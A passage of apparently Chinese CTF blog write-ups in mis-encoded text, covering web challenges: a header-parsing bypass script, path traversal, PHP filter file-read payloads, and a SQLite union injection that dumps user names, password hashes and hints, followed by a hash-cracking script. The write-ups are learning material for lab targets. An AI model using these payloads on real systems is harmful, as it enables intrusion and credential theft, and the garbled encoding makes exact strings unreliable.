å­—ç¬¦ç»„æˆï¼Œä¸åŒ…æ‹¬åˆ†éš”ç¬¦ï¼ŒåŒ…æ‹¬ç©ºæ ¼ã€‚å› æ­¤ï¼Œå¦‚æœä¸€ä¸ª field-name çš„ç¬¬ä¸€ä¸ªå­—ç¬¦æ˜¯ç©ºæ ¼ï¼Œé‚£ä¹ˆè¿™ä¸ª HTTP header æ˜¯éæ³•çš„ï¼Œåº”è¯¥è¢«æœåŠ¡å™¨æˆ–å®¢æˆ·ç«¯å¿½ç•¥æˆ–æ‹’ç»ï¼Œç„¶è€Œï¼ŒNode.js åœ¨å¤„ç†è¿™ç±»æƒ…å†µæ—¶é€šå¸¸æ˜¯å®½å®¹çš„ã€‚ æœ€ç»ˆçš„postçš„å†…å®¹ï¼š {\"headers\": [\"admin: x\", \" true: y\"]} //æ³¨æ„è¿™é‡Œtrueå‰æœ‰ä¸ªç©ºæ ¼ è¿™æ ·å†™å¯ä»¥ç»•è¿‡phpä»£ç ä¸­çš„die(â€œtry hardâ€) è¯¥headersåœ¨nodejsè§£æçš„æ—¶å€™ï¼Œä¼šå¾—åˆ°å¦‚ä¸‹æ•°æ®ï¼š { \"admin\": \"x true y\" } ç»nodejsè§£æåadminå­—æ®µåŒ…å«â€˜trueâ€™ï¼Œæ»¡è¶³æ¡ä»¶ã€‚ pythonè„šæœ¬å¦‚ä¸‹ï¼š import requests import json from abc import ABC from flask.sessions import SecureCookieSessionInterface url = \"http://61.147.171.105:58035/\" datas = {\"headers\": [\"xx:xx admin: true\", \"Content-Type: application/json\"], \"params\": {\"admin\": \"true\"}} for i in range(1020): datas[\"params\"][\"x\" + str(i)] = i headers = { \"Content-Type\": \"application/json\" } json1 = json.dumps(datas) print(json1) resp = requests.post(url, headers=headers, data=json1) print(resp.content) æ€»ç»“ï¼š åˆ°è¿™é‡Œå¯¹æˆ‘è¿™ä¸ªèœé¸¡å°±æœ‰éš¾åº¦äº†ï¼Œä¸å€Ÿé‰´wpæ ¹æœ¬ä¸è¡Œï¼Œä½†æ˜¯ä¹Ÿåº”è¯¥ä¸»åŠ¨å‡ºå‡»ï¼Œé‡åˆ°è¿™ç§çœ‹åˆ°äº†æºç ï¼Œåº”è¯¥ä»”ç»†åˆ†æï¼Œæ¯”å¦‚ä¸€çœ‹é‚£ä¸ªjsæˆ‘æ²¡æœ‰æƒ³åˆ°ï¼Œè¿™æ˜¯ä¸€ä¸ªwebæ¡†æ¶expressï¼Œæˆ–è®¸çŸ¥é“äº†åå¯ä»¥å¤šå»äº†è§£äº†è§£æœ‰ä»€ä¹ˆç›¸å…³ç‰¹æ€§æˆ–è€…æ¼æ´ï¼Œæœ‰å¯èƒ½å°±æœ‰æ‰€æ€è·¯ï¼Œä¸è‡³äºä¸€è‚¡è„‘çš„ç…§æ¬ã€‚ å‚è€ƒæ–‡ç« ï¼š wpå‚è€ƒä¸€ wpå‚è€ƒäºŒ","categories":["æ”»é˜²ä¸–ç•Œ"]},{"title":"æ”»é˜²ä¸–ç•Œ-ezbypass-cat","path":"/2023/08/22/ezbypass-cat/","content":"é¢˜ç›®æè¿°ï¼š ezbypass-cat é¢˜ç›®è§£é¢˜ï¼š æ‰“å¼€æ˜¯ä¸€ä¸ªç™»å½•é¡µé¢ï¼Œä¾æ—§å°è¯•å¼±å£ä»¤ï¼Œä½†æ²¡æœ‰æ•ˆæœï¼Œåªæ¸…æ¥šç”¨æˆ·åä¸€å®šæœ‰adminï¼Œä¸”å¯†ç ç»è¿‡äº†åŠ å¯†ï¼Œä¸èƒ½çˆ†ç ´ï¼Œé¡µé¢æºä»£ç ä¹Ÿæ²¡å•¥ä¿¡æ¯ï¼Œæ‰€ä»¥æˆ‘å°±å¼€å§‹æ‰«ç½‘ç«™ï¼Œéšåå‘ç°äº†å‡ å¤„ä¿¡æ¯æ³„éœ²ï¼š/user/loginï¼Œ/v2/api-docsç­‰ç­‰ã€‚ ä¹‹åå°±ä¸çŸ¥é“å¦‚ä½•åˆ©ç”¨äº†ï¼Œåªæ˜¯æ„Ÿè§‰æ˜¯æœªæˆæƒè®¿é—®æ¼æ´ï¼Œåº”è¯¥æ˜¯æƒ³åŠæ³•éå†åˆ°ç”¨æˆ·åä¸å¯†ç çš„ä¸€äº›æ•°æ®å§ã€‚ã€‚ã€‚ çœ‹äº†wpæ‰å‘ç°ï¼Œdirsearchä¼šç›´æ¥çˆ†ç ´flag.htmlã€‚ã€‚ã€‚ã€‚ã€‚éš¾é“æˆ‘çš„å­—å…¸è¿™ä¹ˆå¼±å—ï¼Œå¥‡æ€ªã€‚ ç›´æ¥è®¿é—®çœ‹çœ‹ï¼Œå‘ç°ç½‘ç«™ä¼šè‡ªåŠ¨é‡å®šå‘ï¼Œé‚£æˆ‘ä»¬åªèƒ½æŠ“åŒ…äº†ï¼Œç»“æœå‘ç°ç›´æ¥è®¿é—®url/flag.htmlç«Ÿç„¶ä¸è¡Œï¼Œäºæ˜¯è€ƒè™‘ä¸€ä¸‹ç›®å½•ç©¿è¶Š è®¿é—®url/index.html/â€¦/flag.htmlåœ¨æŠ“åŒ…ï¼Œå‚è€ƒäº†ä¸€äº›wpå‘ç°ï¼Œä»¥loginå¼€å¤´çš„ç™»å½•ç•Œé¢ä¸€èˆ¬æ˜¯ç™½åå•ï¼Œæ•…è¦ä»¥index.htmlå¼€å¤´","categories":["æ”»é˜²ä¸–ç•Œ"]},{"title":"æ”»é˜²ä¸–ç•Œ-æ–‡ä»¶åŒ…å«","path":"/2023/08/22/wen-jian-bao-han/","content":"é¢˜ç›®æè¿°ï¼š ç®€å•çš„æ–‡ä»¶åŒ…å«-æ³°å±±æ¯ é¢˜ç›®è§£é¢˜ï¼š æœç„¶ï¼Œä»£ç å¾ˆç®€å•ï¼Œä½†è‚¯å®šè¿‡æ»¤çš„å¾ˆä¼¤æ„Ÿ~ï¼Œç®€å•æµ‹è¯•å‡ ä¸‹ å‘ç°è¢«è¿‡æ»¤äº†ï¼Œéšååˆæµ‹è¯•äº†ä¸€ç•ªï¼Œå‘ç°è¿‡æ»¤äº†ä¸€äº›å…³é”®å­—ï¼Œé‚£è‚¯å®šå°±ç”¨åˆ°phpä¼ªåè®®+convertè½¬æ¢è¿‡æ»¤å™¨ï¼Œä¸è¿‡è¿™é‡Œæ²¡æœ‰æ·±å…¥æ€»ç»“ï¼Œæ­¤æ¬¡å°±æ€»ç»“ä¸€ç•ªã€‚ convertè½¬æ¢è¿‡æ»¤å™¨ å¸¸è§çš„convertè½¬æ¢è¿‡æ»¤å™¨æœ‰è¿™ä¸¤ç§ï¼š convert.iconv.&lt;input-encoding&gt;.&lt;output-encoding&gt; convert.quoted-printable-encode å¯¹äºç¬¬ä¸€ç§æ¥è¯´ï¼Œå®ƒé€šè¿‡ PHP çš„ iconv æ‰©å±•å®ç°ï¼Œè¯¥æ‰©å±•å¯ä»¥å¸®åŠ©å°†è¾“å…¥æ•°æ®ä»æŒ‡å®šçš„å­—ç¬¦ç¼–ç ï¼ˆï¼‰è½¬æ¢ä¸ºå¦ä¸€ä¸ªå­—ç¬¦ç¼–ç ï¼ˆï¼‰ å…¶ä¸­input-encodingã€output-encodingæ”¯æŒçš„ç¼–ç æ ¼å¼ä¸ºï¼š UCS-4* UCS-4BE UCS-4LE* UCS-2 UCS-2BE UCS-2LE UTF-32* UTF-32BE* UTF-32LE* UTF-16* UTF-16BE* UTF-16LE* UTF-7 UTF7-IMAP UTF-8* ASCII* EUC-JP* SJIS* eucJP-win* SJIS-win* ISO-2022-JP ISO-2022-JP-MS CP932 CP51932 SJIS-macï¼ˆåˆ«åï¼šMacJapaneseï¼‰ SJIS-Mobile#DOCOMOï¼ˆåˆ«åï¼šSJIS-DOCOMOï¼‰ SJIS-Mobile#KDDIï¼ˆåˆ«åï¼šSJIS-KDDIï¼‰ SJIS-Mobile#SOFTBANKï¼ˆåˆ«åï¼šSJIS-SOFTBANKï¼‰ UTF-8-Mobile#DOCOMOï¼ˆåˆ«åï¼šUTF-8-DOCOMOï¼‰ UTF-8-Mobile#KDDI-A UTF-8-Mobile#KDDI-Bï¼ˆåˆ«åï¼šUTF-8-KDDIï¼‰ UTF-8-Mobile#SOFTBANKï¼ˆåˆ«åï¼šUTF-8-SOFTBANKï¼‰ ISO-2022-JP-MOBILE#KDDIï¼ˆåˆ«åï¼šISO-2022-JP-KDDIï¼‰ JIS JIS-ms CP50220 CP50220raw CP50221 CP50222 ISO-8859-1* ISO-8859-2* ISO-8859-3* ISO-8859-4* ISO-8859-5* ISO-8859-6* ISO-8859-7* ISO-8859-8* ISO-8859-9* ISO-8859-10* ISO-8859-13* ISO-8859-14* ISO-8859-15* ISO-8859-16* byte2be byte2le byte4be byte4le BASE64 HTML-ENTITIESï¼ˆåˆ«åï¼šHTMLï¼‰ 7bit 8bit EUC-CN* CP936 GB18030 HZ EUC-TW* CP950 BIG-5* EUC-KR* UHCï¼ˆåˆ«åï¼šCP949ï¼‰ ISO-2022-KR Windows-1251ï¼ˆåˆ«åï¼šCP1251ï¼‰ Windows-1252ï¼ˆåˆ«åï¼šCP1252ï¼‰ CP866ï¼ˆåˆ«åï¼šIBM866ï¼‰ KOI8-R* KOI8-U* ArmSCII-8ï¼ˆåˆ«åï¼šArmSCII8ï¼‰ å¯¹äºæœ¬é¢˜ï¼Œpayloadä¸ºï¼š ?filename=php://filter/convert.iconv.UTF-8.UTF-16/resource=check.php å›æ˜¾å¦‚ä¸‹ï¼š è¯´æ˜è¿‡æ»¤å™¨æ­£ç¡®ï¼Œä½†ç”¨æ³•é”™è¯¯ï¼Œæ­¤æ—¶å¯ä»¥bpçˆ†ç ´ä¸€ä¸‹æ­£ç¡®çš„ç»„åˆæƒ…å†µ æ‰¾åˆ°æœ‰å›æ˜¾çš„ï¼Œå³æ˜¯æ­£ç¡®çš„ï¼Œæˆ‘ä»¬ç›´æ¥ç”¨å…¶è¯»å–flag ?filename=php://filter/convert.iconv.SJIS%2a.UCS-4%2a/resource=flag.php å‚è€ƒæ–‡ç« ï¼š wpå‚è€ƒä¸€ wpå‚è€ƒäºŒ","categories":["æ”»é˜²ä¸–ç•Œ"]},{"title":"æ”»é˜²ä¸–ç•Œ-FlatScience","path":"/2023/08/22/flatscience/","content":"é¢˜ç›®æè¿°ï¼š æ—  é¢˜ç›®è§£é¢˜ï¼š æ‰“å¼€é¢˜ç›®ï¼Œæ²¡å•¥ä¿¡æ¯ï¼Œåªèƒ½ç‚¹å‡»é“¾æ¥çœ‹çœ‹ï¼Œå‘ç°éƒ½æ˜¯äº›é«˜æ·±çš„pdfã€‚ã€‚ã€‚åˆæ­¥è®¤ä¸ºæ²¡å•¥ç”¨ï¼Œäºæ˜¯ç”¨Acunetixæ‰«äº†ä¸€ä¸‹è¿™ä¸ªç½‘ç«™ï¼Œå‘ç° é‚£æˆ‘ä»¬è®¿é—®çœ‹çœ‹ï¼Œadmin.php å°è¯•äº†å‡ ä¸‹å¼±å£ä»¤ï¼Œæ²¡å•¥ç”¨ï¼Œä½†é¡µé¢æç¤ºnonoï¼Œstopï¼Œçœ‹æºä»£ç  æç¤ºæˆ‘ä»¬ä¸è¦æŒ£æ‰äº†ï¼Œæ ¹æœ¬ç»•ä¸äº†ä¸€ç‚¹ã€‚ã€‚ã€‚ï¼Œé‚£æˆ‘ä»¬ä¼°è®¡ç›¸ä¿¡ï¼Œè¿™é‡Œå…ˆä¸è€ƒè™‘äº† login.php æ„Ÿè§‰æ˜¯sqlæ³¨å…¥ï¼Œå°è¯•ä¸€ä¸‹ä¸‡èƒ½å¯†ç  å‘ç°é¡µé¢æŠ¥é”™ï¼Œä¼°è®¡å°±æ˜¯äº†ï¼Œå¹¶ä¸”è¿‡æ»¤äº†#ï¼Œé‚£æˆ‘ä»¬è¯•è¯•â€“+ å‘ç°è¾“å…¥åè·³è½¬åˆ°äº†index.phpï¼Œè¿™ä¼°è®¡æ˜¯æˆäº†ï¼Œä¹‹åbpæŠ“åŒ…è¯•äº†åŠå¤©ï¼Œæˆ‘ä»¥ä¸ºæ³¨å…¥ç‚¹åœ¨ç”¨æˆ·åä¸Šã€‚ éšåè¯•äº†åŠå¤©åˆ¤æ–­å‡ºå…¶ä¸ºå­—ç¬¦å‹æ³¨å…¥ï¼Œä¸”å­—æ®µæ•°ä¸º2 ä¸”å¦‚ä¸Šå›¾ï¼Œå›æ˜¾ä½ä¸º2 éšåæŸ¥çœ‹äº†é¡µé¢æºä»£ç ï¼Œç®­å¤´è¡¨ç¤ºç§»å‡ºdebugå‚æ•°ï¼Œè¿™æ—¶æˆ‘å°±æƒ³åˆ°ä¼šä¸ä¼šæ˜¯urlä¼ ä¸€ä¸ªdebugå‚æ•°ï¼Œäºæ˜¯ä¹æœ‰äº†æ¥ä¸‹æ¥çš„ å‘ç°å›æ˜¾äº†æºä»£ç  &lt;?php ob_start(); ?&gt; &lt;?php if(isset($_POST['usr']) &amp;&amp; isset($_POST['pw'])){ $user = $_POST['usr']; $pass = $_POST['pw']; $db = new SQLite3('../fancy.db'); $res = $db-&gt;query(\"SELECT id,name from Users where name='\".$user.\"' and password='\".sha1($pass.\"Salz!\").\"'\"); if($res){ $row = $res-&gt;fetchArray(); } else{ echo \"&lt;br&gt;Some Error occourred!\"; } if(isset($row['id'])){ setcookie('name',' '.$row['name'], time() + 60, '/'); header(\"Location: /\"); die(); } } if(isset($_GET['debug'])) highlight_file('login.php'); ?&gt; SQLLite3 æ ¹æ®æŠ¥é”™SQLLite3æ‰¾åˆ°å¯¹åº”çš„æŸ¥è¯¢æ•°æ®åº“çš„ä»£ç  CppSQLite3Queryquery = db.execQuery(\"select * fromtarget_table\"); while(!query.eof()) { cout&lt;&lt;\"name:\"&lt;&lt;query.getStringField(\"name\")&lt;&lt;\"age : \"&lt;&lt;query.getIntField(\"age\")&lt;&lt;endl; query.nextRow(); } query.finalize(); CppSQLite3Queryæ˜¯ä¸€ä¸ªæŸ¥è¯¢è¿”å›å¯¹è±¡ï¼ŒæŸ¥è¯¢å®Œåå¯ä»¥åˆ©ç”¨æ­¤ç±»ã€‚è¿™é‡Œå°±ä½¿ç”¨CppSQLite3DBçš„ä¸€ä¸ªå‡½æ•° execQueryï¼Œåªè¦å°†æŸ¥è¯¢sqlä¼ å…¥å³å¯ã€‚ eofå‡½æ•°ï¼šåˆ¤æ–­æ˜¯å¦è¿˜æœ‰æ•°æ®ï¼› nextRowå‡½æ•°ï¼šç§»åˆ°ä¸‹ä¸€æ¡è®°å½•ï¼› getStringFieldå‡½æ•°ï¼šè·å¾—ç›¸åº”å­—æ®µçš„å†…å®¹ï¼Œä»¥å­—ç¬¦ä¸²å½¢å¼è¿”å›ï¼› getIntFieldå‡½æ•°ï¼šè·å¾—ç›¸åº”å­—æ®µçš„å†…å®¹ï¼Œä»¥æ•´å½¢å½¢å¼è¿”å›ã€‚ ç»“åˆä¸Šè¿°æºä»£ç ï¼š æ‰¾åˆ°å…³é”®ä»£ç SQLè¯­å¥ï¼š \"SELECT id,name from Users where name='\".$user.\"' and password='\".sha1($pass.\"Salz!\").\"'\" é€šè¿‡SQLè¯­å¥æ³¨å…¥æ„å»ºæˆ‘ä»¬è®¾è®¡å‡ºå¦‚ä¸‹æŸ¥è¯¢çš„SQLè¯­å¥ï¼š ' union select name,sql from sqlite_master-- è‡³äºä¸ºä½•æ˜¯è¯¥è¯­å¥ï¼š SQLiteæ•°æ®åº“ä¸­å­˜åœ¨ä¸€ä¸ªsqlite_masteré»˜è®¤è¡¨ï¼Œç±»ä¼¼äºmysqlä¸­çš„information_schemaï¼Œå¯ä»¥åœ¨sqlite_masterä¸­æŸ¥çœ‹æ‰€æœ‰çš„è¡¨åï¼Œä»¥åŠä¹‹å‰æ‰§è¡Œè¿‡çš„å»ºè¡¨è¯­å¥ï¼Œè¯¦ç»†å†…å®¹å¦‚ä¸‹ï¼š sqlite_master ---- SQLiteçš„ç³»ç»Ÿè¡¨ã€‚è¯¥è¡¨è®°å½•æ•°æ®åº“ä¸­ä¿å­˜çš„è¡¨ï¼Œç´¢å¼•ï¼Œè§†å›¾å’Œè§¦å‘å™¨ä¿¡æ¯ã€‚åœ¨åˆ›å»ºsqliteæ•°æ®åº“æ—¶è¯¥è¡¨ä¼šè‡ªåŠ¨åˆ›å»ºï¼Œsqlite_masterè¡¨åŒ…å«5ä¸ªå­—æ®µï¼š type ---- è®°å½•è¯¥é¡¹ç›®çš„ç±»å‹ï¼Œå¦‚ï¼štableã€indexã€viewã€trigger name ---- è®°å½•è¯¥é¡¹ç›®çš„åç§°ï¼Œå¦‚ï¼šè¡¨åã€ç´¢å¼•åç­‰ tbl_name ---- è®°å½•æ‰€ä»å±çš„è¡¨åï¼Œå¦‚ç´¢å¼•æ‰€åœ¨çš„è¡¨åã€‚å¯¹äºè¡¨æ¥è¯´è¯¥åˆ—å°±æ˜¯è¡¨åæœ¬èº«ã€‚ rootpage ---- è®°å½•é¡¹ç›®åœ¨æ•°æ®åº“é¡µä¸­å­˜å‚¨çš„ç¼–å·ã€‚å¯¹äºè¯•å›¾å’Œè§¦å‘å™¨è¯¥å­—æ®µä¸º0æˆ–è€…NULL sql ---- è®°å½•åˆ›å»ºè¯¥é¡¹ç›®çš„sqlè¯­å¥ soï¼Œæˆ‘ä»¬å¯ä»¥æ„é€ å¦‚ä¸‹æ‰€ç¤ºçš„sqlè¯­å¥ select tbl_name from sqlite_master ---- æŸ¥è¯¢æ‰€æœ‰çš„è¡¨å select sql from sqlite_master ---- æŸ¥è¯¢æ‰§è¡Œè¿‡çš„sqlè¯­å¥ select sql from sqlite_master where type='table' and tbl_name='Users' ---- æŸ¥è¯¢åˆ›å»ºUsersè¡¨çš„sqlè¯­å¥ é¦–å…ˆæŸ¥åˆ°è¡¨åï¼Œå†é€šè¿‡åˆ›å»ºè¡¨çš„sqlè¯­å¥æŸ¥åˆ°è¡¨ä¸­çš„å­—æ®µä¿¡æ¯ï¼Œåº”ç”¨å¦‚ä¸‹ è¡¨åï¼šUsersï¼š1' union select 1, tbl_name from sqlite_master--+ Usersè¡¨çš„å­—æ®µï¼š1' union select 1, sql from sqlite_master where type='table' and tbl_name='Users'--+ +CREATE+TABLE+Users%28id+int+primary+key%2Cname+varchar%28255%29%2Cpassword+varchar%28255%29%2Chint+varchar%28255%29%29; url-decode: CREATE TABLE Users(id int primary key,name varchar(255),password varchar(255),hint varchar(255)); Usersè¡¨æœ‰å››ä¸ªå­—æ®µï¼šidï¼Œnameï¼Œpasswordï¼Œhintï¼Œåˆ©ç”¨group_concat()åˆ†åˆ«æŸ¥è¯¢nameï¼Œpasswordå’Œhintå­—æ®µã€‚æ‰§è¡Œå¦‚ä¸‹æ‰€ç¤ºçš„å‘½ä»¤ 1' union select 1,group_concat(name,\"++++\") from Users --+ 1' union select 1,group_concat(password,\"++++\") from Users --+ 1' union select 1,group_concat(hint,\"++++\") from Users --+ åˆ†åˆ«è¾“å‡º 1.+admin%2B%2B%2B%2Bfritze%2B%2B%2B%2Bhansi; //è§£ç å¾—åˆ°: admin++++fritze++++hansi; 2.+3fab54a50e770d830c0416df817567662a9dc85c%2B%2B%2B%2B54eae8935c90f467427f05e4ece82cf569f89507%2B%2B%2B%2B34b0bb7c304949f9ff2fc101eef0f048be10d3bd; //è§£ç å¾—åˆ°: 3fab54a50e770d830c0416df817567662a9dc85c++++54eae8935c90f467427f05e4ece82cf569f89507++++34b0bb7c304949f9ff2fc101eef0f048be10d3bd; 3.+my+fav+word+in+my+fav+paper%3F%21%2B%2B%2B%2Bmy+love+is%E2%80%A6%3F%2B%2B%2B%2Bthe+password+is+password; //è§£ç å¾—åˆ° my fav word in my fav paper?!++++my love isÃ¢Â€Â¦?++++the password is password; //ç¬¬ä¸‰ä¸ªè¯´æ˜å…³é”®è¯åœ¨è¯¥ä½œè€…çš„è®ºæ–‡ä¸­ ç»¼ä¸Šæ‰€è¿°ï¼Œæˆ‘ä»¬çŸ¥é“ç”¨æˆ·çš„å¯†ç æ˜¯ç”±ç”¨æˆ·è¾“å…¥çš„å¯†ç è¿æ¥\"Salz!\"å­—ç¬¦ä¸²åç»è¿‡sha1åŠ å¯†åå¾—åˆ°çš„ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬éœ€è¦é€šè¿‡è„šæœ¬å»çˆ¬å–è¯¥ä½œè€…çš„è®ºæ–‡å†…å®¹ï¼Œè®©å…¶ä¸è¯¥å­—ç¬¦ä¸²è¿æ¥ååœ¨ç»è¿‡sha1åŠ å¯†å¾—åˆ°çš„å­—æ®µä¸æ•°æ®åº“æŸ¥è¯¢åˆ°çš„adminæ‰€å¯¹åº”çš„å­—æ®µç›¸ç­‰ï¼Œé‚£å°±æ˜¯æˆ‘ä»¬è¦çš„password é‚£è€ƒè™‘åˆ°æˆ‘çš„æ°´å¹³ï¼Œå°±åšä¸ªè„šæœ¬å°å­å§ import requests from bs4 import BeautifulSoup import os import re import hashlib from pdfminer.pdfparser import PDFParser from pdfminer.pdfdocument import PDFDocument from pdfminer.pdfpage import PDFPage from pdfminer.pdfpage import PDFTextExtractionNotAllowed from pdfminer.pdfinterp import PDFResourceManager from pdfminer.pdfinterp import PDFPageInterpreter from pdfminer.layout import * from pdfminer.converter import PDFPageAggregator # å°†pdfè½¬æ¢ä¸ºtxtçš„å‡½æ•° def pdf2txt(path): # æ‰“å¼€PDFæ–‡ä»¶ pdfFile = open(path, 'rb') # åˆ›å»ºpdfæ–‡æ¡£åˆ†æå™¨ parser = PDFParser(pdfFile) # åˆ›å»ºPDFæ–‡æ¡£å¯¹è±¡å­˜å‚¨æ–‡æ¡£ç»“æ„ document = PDFDocument(parser) # æ£€æŸ¥æ–‡ä»¶æ˜¯å¦å…è®¸æ–‡æœ¬æå– if not document.is_extractable: raise PDFTextExtractionNotAllowed # åˆ›å»ºPDFèµ„æºç®¡ç†å™¨å¯¹è±¡æ¥å­˜å‚¨å…±äº«èµ„æº resource = PDFResourceManager() # è®¾å®šå‚æ•°è¿›è¡Œåˆ†æ laparams = LAParams() # åˆ›å»ºä¸€ä¸ªPDFè®¾å¤‡å¯¹è±¡ device = PDFPageAggregator(resource, laparams=laparams) # åˆ›å»ºä¸€ä¸ªPDFè§£é‡Šå™¨å¯¹è±¡ interpreter = PDFPageInterpreter(resource,device) # åˆ›å»ºå­˜å‚¨è½¬æ¢ç»“æœçš„åŒåtxtæ–‡ä»¶ fileName = str(path.split(\".\")[0]) newFileName = fileName + \".txt\" f = open(newFileName, \"w\") # å¤„ç†æ¯ä¸€é¡µ for page in PDFPage.create_pages(document): interpreter.process_page(page) # æ¥å—è¯¥é¡µé¢çš„LTPageå¯¹è±¡ layout = device.get_result() for x in layout: if (isinstance(x, LTTextBoxHorizontal)): # å†™å…¥txtæ–‡ä»¶ try: f.writelines(x.get_text() + \" \") except: pass f.close() # ä¸‹è½½æ‰€æœ‰pdfæ–‡ä»¶çš„å‡½æ•° def downloadpdf(): pdfUrl = [] # å­˜æ”¾æ‰€æœ‰pdfæ–‡ä»¶çš„è¿æ¥ # çˆ¬å–æ‰€æœ‰çš„pdfæ–‡ä»¶çš„è¿æ¥ urlList = [ \"http://220.249.52.134:44174/\", \"http://220.249.52.134:44174/1/index.html\", \"http://220.249.52.134:44174/1/2/index.html\", \"http://220.249.52.134:44174/1/2/4/index.html\", \"http://220.249.52.134:44174/1/2/5/index.html\", \"http://220.249.52.134:44174/1/3/index.html\", \"http://220.249.52.134:44174/1/3/6/index.html\", \"http://220.249.52.134:44174/1/3/7/index.html\", \"http://220.249.52.134:44174/1/3/7/8/index.html\" ] for each in urlList: r = requests.get(url=each) soup = BeautifulSoup(r.text, 'lxml') result = soup.find_all(name=\"a\", attrs={\"title\":\"my very fav paper\"}) for tmp in result: if tmp[\"href\"].endswith(\".pdf\"): pdfUrl.append(each.split(\"index.html\")[0] + tmp[\"href\"]) # ä½¿ç”¨curl -O å‘½ä»¤ä¸‹è½½pdfæ–‡ä»¶ for each in pdfUrl: os.system(\"curl -O \" + each) # å–hashå€¼çš„å‡½æ•° def sha1(msg): sha1 = hashlib.sha1() sha1.update((msg + \"Salz!\").encode(\"utf-8\")) return sha1.hexdigest() # ç ´è§£å¯†ç çš„å‡½æ•° def getpassword(): passlist = { \"3fab54a50e770d830c0416df817567662a9dc85c\":\"admin\", \"54eae8935c90f467427f05e4ece82cf569f89507\":\"fritze\", \"34b0bb7c304949f9ff2fc101eef0f048be10d3bd\":\"hansi\" } for each in os.listdir(os.curdir): # å–å‡ºtxtæ–‡ä»¶ if each.endswith(\".txt\"): with open(each, \"r\") as file: a = file.read() b = re.split(r\"[\\s\\,\\;\\.]+\", a) # å°†å•è¯åˆ†å‰²å‡ºæ¥ c = [] tmp = \"\" judge = False # å¤„ç†ä»¥-ç»“å°¾çš„è¡Œï¼Œæœ€ç»ˆçš„ç»“æœä¿å­˜åœ¨cä¸­ for each in b: if each.endswith(\"-\"): tmp = each.split(\"-\")[0] judge = True elif judge: c.append(tmp + each) judge = False else: c.append(each) # éå†cç¢°æ’å¾—åˆ°å¯†ç  for each in c: print(each) if sha1(each) in passlist: return \"----\" + passlist[sha1(each)] + \"'s password is \" + each + \"Salz!\" + \"----\" def main(): os.chdir(os.curdir + os.sep + \"pdfdir\") # ä¿®æ”¹å·¥ä½œç›®å½• downloadpdf() # ä¸‹è½½pdfæ–‡ä»¶ # å°†æ‰€æœ‰pdfæ–‡ä»¶è½¬æ¢æˆtxtæ–‡ä»¶ for each in os.listdir(os.curdir): pdf2txt(each) # éå†æ‰€æœ‰çš„txtæ–‡ä»¶å¾—åˆ°å¯†ç  password = getpassword() return password if __name__ == \"__main__\": print(main()) è¿™ä¸ªè„šæœ¬æ˜¯å¯ä»¥èµ°å‡ºæ¥çš„ï¼Œä¸è¿‡ä¼¼ä¹æ˜¯æˆ‘å´ä¸€ç›´æŠ¥é”™ï¼Œéšååˆçœ‹äº†äº†å‡ ç¯‡wpï¼Œå‘ç°è¿™é‡Œç«Ÿç„¶å¯ä»¥ç›´æ¥md5è§£å¯†ï¼Ÿï¼Ÿ ThinJerboaSalz! //å¾ˆå¥½åŠäº†ï¼Œå‡ºå»salzï¼Œå°±æ˜¯å¯†ç äº†ï¼šThinJerboa äºæ˜¯å»äº†è§£äº†ä¸€ç•ªsha1ä¸md5åŠ å¯†ï¼Œæˆ‘ä¹‹å‰ä¸€ç›´è®¤ä¸ºè¿™ä¸¤ä¸ªåŠ å¯†æ˜¯æœ¬è´¨ä¸Šçš„ä¸åŒçš„ï¼Œç»“æœå¹¶ä¸æ˜¯ã€‚ã€‚ã€‚ å¹¶ä¸”è¿™ç§åšæ³•æœ‰ä¸€å®šé£é™©ï¼Œå› ä¸ºä¸ä¸€å®šèƒ½æŸ¥åˆ°ï¼Œè¿™é‡Œæˆ‘æŸ¥åˆ°äº†ï¼š 1ã€å®‰å…¨æ€§ä¸åŒ SHA-1 çš„å®‰å…¨æ€§æ¯”MD5é«˜ã€‚ç›¸å¯¹MD5è€Œè¨€ï¼ŒSHA-1çš„å®‰å…¨æ€§æ¯”è¾ƒé«˜ä¸€äº›ï¼Œå¦‚æœå•çº¯ä½¿ç”¨MD5å¯èƒ½æ¯”è¾ƒå®¹æ˜“é­åˆ°æ’åº“æ”»å‡»ã€‚é€šè¿‡é¢„å…ˆè®¡ç®—çŸ¥é“MD5çš„å¯¹åº”å…³ç³»ï¼Œå­˜åœ¨æ•°æ®åº“ä¸­ï¼Œç„¶åä½¿ç”¨çš„æ—¶å€™åæŸ¥ã€‚ 2ã€æ ¡éªŒå€¼çš„é•¿åº¦ä¸åŒ MD5æ ¡éªŒä½çš„é•¿åº¦æ˜¯16ä¸ªå­—èŠ‚ï¼ˆ128ä½ï¼‰ï¼›SHA-1æ˜¯20ä¸ªå­—èŠ‚ï¼ˆ160ä½ï¼‰ï¼› 3ã€è¿è¡Œé€Ÿåº¦ä¸åŒ SHA-1 çš„è¿è¡Œé€Ÿåº¦æ¯”MD5æ…¢ã€‚ å‚è€ƒæ–‡ç« ï¼š wpå‚è€ƒä¸€ wpå‚è€ƒäºŒ","categories":["æ”»é˜²ä¸–ç•Œ"]},{"title":"æ”»é˜²ä¸–ç•Œ-Confusion1","path":"/2023/08/21/confusion1/","content":"é¢˜ç›®æè¿°ï¼š æŸå¤©ï¼ŒBobè¯´ï¼šPHPæ˜¯æœ€å¥½çš„è¯­è¨€ï¼Œä½†æ˜¯Aliceä¸èµåŒã€‚æ‰€ä»¥Aliceç¼–å†™äº†è¿™ä¸ªç½‘ç«™è¯æ˜ã€‚åœ¨å¥¹è¿˜æ²¡æœ‰å†™å®Œçš„æ—¶å€™ï¼Œæˆ‘å‘ç°å…¶å­˜åœ¨é—®é¢˜ã€‚(è¯·ä¸è¦ä½¿ç”¨æ‰«æå™¨) é¢˜ç›®è§£é¢˜ï¼š è¿›å…¥é¡µé¢ï¼Œæºä»£ç ä¹Ÿæ²¡å•¥ä¿¡æ¯ï¼Œçœ‹ä¸€ä¸‹å…¶ä»–é¡µé¢ï¼Œé¡µé¢éƒ½ä¸€æ ·ï¼ŒæŸ¥çœ‹æºä»£ç  å‘ç°æ¯ä¸ªé¡µé¢éƒ½æœ‰è¿™ä¸¤æ¡æ³¨é‡Šä¿¡æ¯ï¼Œè®¿é—®ä¹Ÿæ²¡å•¥ç”¨ï¼Œåˆæ­¥åªèƒ½è¯æ˜ä»–ç”¨çš„pythonçš„æŸä¸ªæ¡†æ¶ ç„¶åæˆ‘å°è¯•åœ¨urlåé¢åŠ ä¸Š49ï¼Œå‘ç°è¯¥å˜é‡è¢«è§£æäº† ä½†å½“æˆ‘è¿›ä¸€æ­¥æœå¯»åŸºç±»æ—¶ï¼Œä¾¿å‡ºç°äº† 